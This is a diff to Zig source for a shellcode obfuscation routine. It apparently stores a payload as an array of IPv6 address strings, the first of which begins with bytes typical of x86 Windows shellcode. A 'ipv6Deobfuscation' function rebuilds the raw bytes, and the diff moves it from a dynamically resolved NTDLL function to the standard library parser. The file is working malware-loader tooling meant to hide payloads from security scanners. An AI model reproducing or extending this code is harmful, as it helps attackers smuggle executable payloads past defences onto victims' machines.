@@ -1,6 +1,5 @@
 const std = @import("std");
-const windows = std.os.windows;
-const WINAPI = windows.WINAPI;
+const net = std.net;
 
 const IPV6_ARRAY: [13][]const u8 = [_][]const u8{
     "fce8:8200:0000:6089:e531:c064:8b50:308b",
@@ -20,23 +19,13 @@ const IPV6_ARRAY: [13][]const u8 = [_][]const u8{
 const NUMBER_OF_ELEMENTS: usize = 13;
 
 fn ipv6Deobfuscation(ipv6_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
-    const ntdll = try windows.kernel32.GetModuleHandleA("NTDLL");
-    const RtlIpv6StringToAddressA = @as(
-        *const fn([*:0]const u8, [*]?[*:0]const u8, [*]u8) callconv(WINAPI) i32,
-        @ptrCast(windows.kernel32.GetProcAddress(ntdll, "RtlIpv6StringToAddressA").?),
-    );
-
     var buffer = try allocator.alloc(u8, ipv6_array.len * 16);
     var offset: usize = 0;
 
     for (ipv6_array) |ip| {
-        const c_ip = try allocator.dupeZ(u8, ip);
-        defer allocator.free(c_ip);
-        var terminator: ?[*:0]const u8 = null;
-        const result = RtlIpv6StringToAddressA(c_ip.ptr, &terminator, buffer.ptr + offset);
-        if (result != 0) {
-            return error.RtlIpv6StringToAddressAFailed;
-        }
+        const addr = net.Address.parseIp6(ip, 0) catch return error.InvalidIpFormat;
+        const ip_bytes = @as([16]u8, @bitCast(addr.in6.sa.addr));
+        @memcpy(buffer[offset..offset + 16], &ip_bytes);
         offset += 16;
     }
 
